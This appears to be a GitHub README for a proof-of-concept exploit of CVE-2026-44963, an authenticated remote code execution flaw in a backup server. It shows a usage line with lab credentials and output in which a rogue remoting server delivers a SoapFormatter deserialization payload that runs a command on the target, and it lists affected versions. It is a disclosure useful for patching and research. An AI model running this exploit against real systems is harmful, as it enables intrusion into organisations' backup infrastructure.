# CVE_2026_44963
Remote Code Execution (RCE) on the Backup Server by an authenticated domain user.

Check [**blog post**](https://suce0155.github.io/posts/veeam_backup_rce/) post for technical details.


https://github.com/user-attachments/assets/008d5f25-2ec9-4267-b142-0e0b885da591

# PoC
```
CVE-2026-44963.exe -s 192.168.1.165:9001 -u "lab.local\testuser" -p Test1234 192.168.1.163 notepad

[*] Using credentials for lab.local\testuser
[*] Using target:  192.168.1.163:6170/PermanentSessionService
[*] Creating Objref payload for http://192.168.1.165:9001/trigger
[*] Creating SoapFormatter payload for 'cmd /c notepad'
[*] Starting RogueServer
[*] Sending remoting trigger
HttpServerChannel for 'objectUri' created:
  http://192.168.1.165:9001/trigger

Press any key to exit ...
[*] Processing message for '/trigger' from 192.168.1.163:59034 ... sending payload!

```
# Credits
This vulnerability was found by Sina Kheirkhah ([@SinSinology](https://x.com/SinSinology)) of WatchTowr ([@watchtowrcyber](https://x.com/watchtowrcyber)). 

# Affected Versions

| Version                 | Status                              |
|-------------------------|-------------------------------------|
| 12.3.2.4854             | Fully patched.                      |                                                        
| 12.3.2.4465 and earlier | Vulnerable to Authenticated RCE.    |                                                    
